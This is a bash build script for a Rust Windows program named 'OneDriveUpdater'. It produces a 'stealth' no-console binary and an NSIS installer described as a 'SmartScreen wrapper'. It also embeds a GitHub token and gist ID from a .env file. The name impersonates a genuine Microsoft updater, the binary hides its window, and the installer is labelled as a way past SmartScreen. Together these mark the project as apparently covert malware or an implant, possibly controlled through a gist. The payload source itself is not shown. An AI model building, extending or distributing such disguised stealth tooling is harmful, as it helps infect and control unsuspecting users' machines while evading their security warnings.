#!/usr/bin/env bash
# Build OneDriveUpdater — produces two binaries + optional NSIS installer
#
# Outputs:
#   target/x86_64-pc-windows-gnu/release/OneDriveUpdater.exe        ← stealth (no console)
#   target/x86_64-pc-windows-gnu/release/OneDriveUpdater-debug.exe  ← debug  (console visible)
#   OneDriveUpdater-Setup.exe                                        ← NSIS wrapper (if makensis found)
#
# Usage:
#   ./build.sh                  # build both binaries + installer if makensis is installed
#   ./build.sh --no-nsis        # skip NSIS step

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ENV_FILE="$SCRIPT_DIR/.env"
TARGET="x86_64-pc-windows-gnu"

# ── Parse flags ──────────────────────────────────────────────────────────────
NO_NSIS=false
for arg in "$@"; do
  [[ "$arg" == "--no-nsis" ]] && NO_NSIS=true
done

# ── Load secrets ─────────────────────────────────────────────────────────────
if [[ ! -f "$ENV_FILE" ]]; then
  echo "Error: .env file not found at $ENV_FILE" >&2
  exit 1
fi

set -a
# shellcheck disable=SC1090
source <(grep -v '^\s*#' "$ENV_FILE" | grep -v '^\s*$')
set +a

: "${GITHUB_TOKEN:?GITHUB_TOKEN is not set in .env}"
: "${GIST_ID:?GIST_ID is not set in .env}"

# ── 1. Build stealth binary (no console window) ───────────────────────────────
echo ""
echo "═══════════════════════════════════════════════════════"
echo " [1/3] Building OneDriveUpdater (stealth — no console)"
echo "═══════════════════════════════════════════════════════"
cargo build --release \
  --target "$TARGET" \
  --bin OneDriveUpdater \
  --features stealth
echo "  → target/$TARGET/release/OneDriveUpdater.exe"

# ── 2. Build debug binary (console window visible) ────────────────────────────
echo ""
echo "═══════════════════════════════════════════════════════"
echo " [2/3] Building OneDriveUpdater-debug (console visible)"
echo "═══════════════════════════════════════════════════════"
cargo build --release \
  --target "$TARGET" \
  --bin OneDriveUpdater-debug
echo "  → target/$TARGET/release/OneDriveUpdater-debug.exe"

# ── 3. NSIS installer (wraps stealth binary) ──────────────────────────────────
if [[ "$NO_NSIS" == "true" ]]; then
  echo ""
  echo " [3/3] Skipping NSIS (--no-nsis flag set)"
elif command -v makensis &>/dev/null; then
  echo ""
  echo "═══════════════════════════════════════════════════════"
  echo " [3/3] Building NSIS installer (SmartScreen wrapper)"
  echo "═══════════════════════════════════════════════════════"
  cd "$SCRIPT_DIR"
  makensis installer.nsi
  echo "  → OneDriveUpdater-Setup.exe"
else
  echo ""
  echo " [3/3] makensis not found — skipping installer step."
  echo "       Install with: sudo apt install nsis"
  echo "       Then re-run: ./build.sh"
fi

echo ""
echo "Done."
echo "  Stealth  : target/$TARGET/release/OneDriveUpdater.exe"
echo "  Debug    : target/$TARGET/release/OneDriveUpdater-debug.exe"
if [[ -f "$SCRIPT_DIR/OneDriveUpdater-Setup.exe" ]]; then
  echo "  Installer: OneDriveUpdater-Setup.exe"
fi
